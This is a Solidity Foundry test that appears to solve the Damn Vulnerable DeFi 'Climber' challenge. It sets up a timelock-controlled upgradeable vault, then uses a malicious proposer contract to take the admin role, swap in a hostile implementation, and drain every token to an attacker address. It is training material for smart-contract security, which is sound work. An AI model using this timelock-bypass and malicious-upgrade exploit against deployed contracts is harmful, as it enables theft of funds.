// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {Utilities} from "../../utils/Utilities.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
import {MaliciousProposer, NewImplementation} from "./MaliciousProposer.sol";

import {GnosisSafe} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract ClimberTest is Test {
    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    // keccak256("PROPOSER_ROLE");
    bytes32 constant PROPOSER_ROLE =
        0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;
    // keccak256("ADMIN_ROLE");
    bytes32 constant ADMIN_ROLE =
        0xa49807205ce4d355092ef5a8a18f56e8913cf4a201fbe287825b095693c21775;

    Utilities utils;
    DamnValuableToken dvt;
    ClimberTimelock climberTimelock;
    ClimberVault vaultImplementation;
    ERC1967Proxy vaultProxy;
    MaliciousProposer maliciousProposer;
    NewImplementation newImplementation;
    address[] users;
    address deployer;
    address proposer;
    address sweeper;
    address attacker;

    function setUp() public {
        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = users[0];
        proposer = users[1];
        sweeper = users[2];

        attacker = address(
            uint160(uint256(keccak256(abi.encodePacked("attacker"))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vaultImplementation = new ClimberVault();
        vm.label(address(vaultImplementation), "Vault Implementation");

        bytes memory data = abi.encodeWithSignature(
            "initialize(address,address,address)",
            deployer,
            proposer,
            sweeper
        );
        vaultProxy = new ERC1967Proxy(address(vaultImplementation), data);

        assertEq(ClimberVault(address(vaultProxy)).getSweeper(), sweeper);

        assertGt(
            ClimberVault(address(vaultProxy)).getLastWithdrawalTimestamp(),
            0
        );

        climberTimelock = ClimberTimelock(
            payable(ClimberVault(address(vaultProxy)).owner())
        );

        assertTrue(climberTimelock.hasRole(PROPOSER_ROLE, proposer));

        assertTrue(climberTimelock.hasRole(ADMIN_ROLE, deployer));

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(vaultProxy), VAULT_TOKEN_BALANCE);
    }

    function testExploit() public {
        // transfer ownership to an attacker
        maliciousProposer = new MaliciousProposer(
            payable(address(climberTimelock)),
            address(vaultProxy)
        );
        maliciousProposer.changeAdmin(attacker);

        // deploy new implementation
        newImplementation = new NewImplementation();

        bytes memory data = abi.encodeWithSignature(
            "attack(address,address)",
            address(dvt),
            attacker
        );

        // impersonate attacker to change the implementation and drain funds
        vm.prank(attacker);
        (bool success, ) = address(vaultProxy).call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(newImplementation),
                data
            )
        );
        require(success, "Call failed");
        validation();
    }

    function validation() internal {
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(vaultProxy)), 0);
    }
}
